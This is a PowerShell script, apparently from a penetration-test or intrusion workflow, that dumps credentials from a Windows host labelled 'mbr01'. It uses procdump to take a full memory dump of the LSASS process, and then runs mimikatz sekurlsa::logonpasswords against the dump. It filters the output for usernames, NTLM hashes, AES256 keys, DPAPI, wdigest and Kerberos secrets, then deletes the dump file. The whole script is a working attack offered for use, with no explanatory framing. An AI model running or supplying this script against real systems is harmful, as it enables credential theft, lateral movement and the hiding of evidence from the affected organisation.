# 3.5K v3: procdump -ma lsass -> mimikatz sekurlsa::minidump parse (as SYSTEM on mbr01)
$ErrorActionPreference = 'Continue'
$pd = 'C:\Windows\Temp\cadre-tools\procdump64.exe'
$mik = 'C:\Windows\Temp\cadre-tools\mimikatz.exe'
$dump = 'C:\Windows\Temp\cadre-lsass2.dmp'
$o = 'C:\Windows\Temp\cadre-minidump.txt'

# 1. Full LSASS dump via procdump (Microsoft-signed)
Remove-Item $dump -ErrorAction SilentlyContinue
& $pd -accepteula -ma lsass.exe $dump 2>&1 | Select-Object -First 6 | ForEach-Object { Write-Output "PD|$_" }
Start-Sleep -Seconds 3
if (Test-Path $dump) { Write-Output "DUMP_SIZE $((Get-Item $dump).Length)" } else { Write-Output 'DUMP_MISSING' }

# 2. Parse offline with mimikatz minidump
if (Test-Path $dump) {
    Remove-Item $o -ErrorAction SilentlyContinue
    cmd.exe /c "`"$mik`" sekurlsa::minidump $dump sekurlsa::logonpasswords exit > `"$o`" 2>&1"
    Start-Sleep -Seconds 2
    Write-Output "MINIDUMP_OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
    Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'Authentication Id|Username|Domain|NTLM|AES256|DPAPI|ERROR|minidump|msv|tspkg|wdigest|kerberos' | Select-Object -First 60 | ForEach-Object { $_.Line }
    # 3. cleanup
    Remove-Item $dump -ErrorAction SilentlyContinue
    Write-Output "DUMP_CLEANED $(-not (Test-Path $dump))"
}
Write-Output '3.5K_V3_DONE'
